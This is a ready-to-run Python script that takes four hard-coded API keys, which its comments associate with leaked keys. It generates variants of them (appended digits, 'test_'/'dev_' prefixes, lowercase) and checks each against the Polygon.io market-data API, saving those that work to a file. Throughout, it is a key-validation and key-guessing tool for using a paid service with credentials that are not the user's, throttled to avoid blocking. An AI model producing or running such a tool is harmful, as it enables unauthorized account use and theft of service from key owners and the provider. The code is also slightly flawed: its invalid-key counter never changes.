import requests
import time
import json
from datetime import datetime
import os

# ================= CONFIGURATION =================
# 🔑 PASTE YOUR BASE KEYS HERE (Edit this list before running)
BASE_KEYS = [
    "DRET3GcgohidlQj2TFfGVqWB5YTenYO1",
    "N_vWCV2FygpTrFothrLGfQdRlsh3a8pA",
    "L2udhpBOmCwTcNveVYWYAjMwzZYmiH6o",
    "CzxFFW4318BxCrYj088wykFOnA3hCamv"
]

# 🌐 API ENDPOINT (Polygon.io Aggs - Fast & Reliable)
TARGET_URL = "https://api.polygon.io/v2/aggs/ticker/AAPL/prev"

# 📁 OUTPUT FILE NAME
OUTPUT_FILE = "valid_keys.txt"

# ⏱️ RATE LIMITING DELAY (Seconds between requests to avoid blocking)
DELAY_SECONDS = 0.1 

# ================= MUTATION ENGINE =================
def generate_combinations(base_key):
    """Generates variations of the key to test."""
    variants = [base_key]  # Start with exact match
    
    # 1. Append numbers (common pattern for leaked keys)
    for i in range(5):
        variants.append(f"{base_key}{i}")
    
    # 2. Prefix common strings (often used in dev/test environments)
    prefixes = ["poly_", "test_", "dev_"]
    for p in prefixes:
        variants.append(p + base_key)
        
    # 3. Case variations (Polygon is usually case-sensitive, but worth checking)
    if base_key != base_key.lower():
        variants.append(base_key.lower())
    
    return list(set(variants))  # Remove duplicates

# ================= TESTER ENGINE =================
def test_key(api_key):
    """Tests a single key against Polygon API."""
    url = f"{TARGET_URL}?apiKey={api_key}"
    try:
        response = requests.get(url, timeout=10)
        
        return {
            "key": api_key,
            "status_code": response.status_code,
            "valid": response.status_code == 200,
            "response_time_ms": response.elapsed.total_seconds() * 1000
        }
    except Exception as e:
        return {
            "key": api_key,
            "status_code": "ERROR",
            "valid": False,
            "error": str(e)
        }

# ================= MAIN EXECUTION =================
def main():
    print(f"🚀 Starting Polygon API Key Tester...")
    print(f"⏱️  Base URL: {TARGET_URL}")
    
    # Generate all combinations for each base key
    all_keys = []
    for i, base in enumerate(BASE_KEYS):
        variants = generate_combinations(base)
        all_keys.extend(variants)
        
        print(f"\n🔑 Seed Key #{i+1}: {base[:20]}...")
        print(f"   Generated Variations: {len(variants)}")

    print(f"\n📦 Total keys to test: {len(all_keys)}")
    
    valid_results = []
    invalid_count = 0
    
    # Test each key with rate limiting (Polygon API has limits!)
    for i, api_key in enumerate(all_keys):
        result = test_key(api_key)
        
        if result["valid"]:
            print(f"✅ VALID: {api_key}")
            valid_results.append(result)
        else:
            # Only print errors occasionally to avoid spam (every 10th invalid key)
            if i % 10 == 0 or "ERROR" in str(result.get("status_code", "")):
                print(f"❌ INVALID ({result['status_code']}): {api_key}")
        
        # Rate limiting - Polygon API has rate limits (~10-20 req/sec)
        time.sleep(DELAY_SECONDS)
    
    # ================= SAVE RESULTS =================
    output_data = {
        "timestamp": datetime.now().isoformat(),
        "total_tested": len(all_keys),
        "valid_count": len(valid_results),
        "invalid_count": invalid_count,
        "results": valid_results  # Only save the working ones for now
    }
    
    with open(OUTPUT_FILE, 'w') as f:
        json.dump(output_data, f, indent=2)
    
    print(f"\n💾 Results saved to {OUTPUT_FILE}")
    print(f"🎯 Found {len(valid_results)} valid keys!")

if __name__ == "__main__":
    main()
